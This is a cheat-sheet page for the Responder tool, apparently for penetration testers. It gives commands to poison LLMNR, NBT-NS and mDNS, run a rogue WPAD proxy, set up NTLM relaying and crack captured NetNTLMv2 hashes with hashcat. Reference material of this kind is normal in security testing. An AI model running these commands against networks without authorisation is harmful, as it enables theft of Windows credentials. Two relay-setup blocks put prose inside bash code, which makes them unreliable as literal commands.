# Responder

> An LLMNR, NBT-NS and mDNS poisoner that captures Windows authentication hashes on a local network, and a staging ground for NTLM relay attacks.

- Category: Active Directory
- Commands: 8
- Page: https://terminal.rokibulroni.com/tool/active-directory/responder
- Homepage: https://github.com/lgandx/Responder
- Documentation: https://github.com/lgandx/Responder
- Tags: Active Directory, NTLM, poisoning, MITM

## Install

- apt: `sudo apt install responder`
- pipx: `pipx install git+https://github.com/lgandx/Responder`

## Poisoning

### sudo responder -I <iface>

```bash
sudo responder -I <iface>
```

Example:

```bash
sudo responder -I eth0
```

Answers LLMNR, NBT-NS and mDNS queries to capture NetNTLM hashes from hosts looking up bad names.

### sudo responder -I <iface> -w

```bash
sudo responder -I <iface> -w
```

Example:

```bash
sudo responder -I eth0 -w
```

Also starts the rogue WPAD proxy to capture HTTP authentication.

### sudo responder -I <iface> -dw

```bash
sudo responder -I <iface> -dw
```

Example:

```bash
sudo responder -I eth0 -dwv
```

Enables answers for more query types plus verbose output.

### sudo responder -I <iface> -A

```bash
sudo responder -I <iface> -A
```

Example:

```bash
sudo responder -I eth0 -A
```

Analyze mode: watches and logs poisoning opportunities without actually answering — safe for recon.


## Relaying setup

### sudo responder -I <iface> with SMB=Off, HTTP=Off in Responder.conf

```bash
sudo responder -I <iface> with SMB=Off, HTTP=Off in Responder.conf
```

Example:

```bash
sudo nano /usr/share/responder/Responder.conf
```

Turn the SMB and HTTP servers off so ntlmrelayx can bind them for relaying.

### sudo responder -I <iface> -A then run ntlmrelayx.py -tf targets.txt

```bash
sudo responder -I <iface> -A then run ntlmrelayx.py -tf targets.txt
```

Example:

```bash
sudo responder -I eth0 -A
```

Pairs Responder (listening only) with Impacket ntlmrelayx to relay captured auth.


## Loot

### ls /usr/share/responder/logs/

```bash
ls /usr/share/responder/logs/
```

Captured NetNTLMv1/v2 hashes are written here, one file per protocol and host.

### hashcat -m 5600 <hashfile> <wordlist>

```bash
hashcat -m 5600 <hashfile> <wordlist>
```

Example:

```bash
hashcat -m 5600 logs/SMB-NTLMv2-SSP-10.10.10.7.txt rockyou.txt
```

Cracks captured NetNTLMv2 hashes.

## Related tools

- [Impacket](https://terminal.rokibulroni.com/tool/active-directory/impacket)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
- [Hashcat](https://terminal.rokibulroni.com/tool/credentials/hashcat)
